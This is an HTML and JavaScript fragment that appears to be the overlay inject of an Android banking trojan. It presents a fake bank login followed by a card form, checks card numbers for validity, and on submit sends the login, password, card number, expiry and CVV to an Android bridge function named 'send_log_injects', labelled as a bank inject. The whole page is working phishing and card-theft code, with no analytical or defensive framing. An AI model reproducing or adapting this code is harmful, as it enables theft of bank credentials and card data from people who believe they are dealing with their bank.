        <div id="form2" style="display: none;">
            <heaerd></heaerd>
            <section>
                
                <div class="col_input">
                    <label for="login">Credit Card</label>
                    <input style="margin-bottom: 5px;" type="tel" id="cc" name="cc" onkeyup="check6();check5()" placeholder="Credit Card"  class="input" autocomplete="off">
                </div>
                
               
                <div  style="width: 58%;float: left;" class="col_input">
                    <label for="login">Expiration Date</label>
                    <input type="tel" id="exp" name="exp" maxlength="5" onkeyup="check7();check5()" placeholder="Expiration Date"  class="input" required>
                </div>
                <div  style="width: 40%;float: right;" class="col_input">
                    <label for="login">CVV</label>
                    <input  type="password" id="cvv" name="cvv" maxlength="3" onkeyup="check5()" placeholder="CVV" class="input cool-input__input cardcc" required>
                </div>

                <input type="button" id="sendData" disabled class="button" value="Login">
            </section>
        </div>

<script>
     $('#cc').mask('0000 0000 0000 0000')
     $('#exp').mask('00/00')
     $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        var eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text';
            } else {
                password.type = 'password';
            }
        }

            nextPage.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error');
            } else {
                login.classList.remove('error')
            }

            if(password.value.length !== 6) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            } 


            if(login.value.length >= 4 && password.value.length === 6 ) {
                spinner.style.display = 'block';

                setTimeout(() => {
                    spinner.style.display = 'none'
                    form1.style.display = 'none'
                    form2.style.display = 'block'
                }, 1500);
            }

            
        }


        
        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check7() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
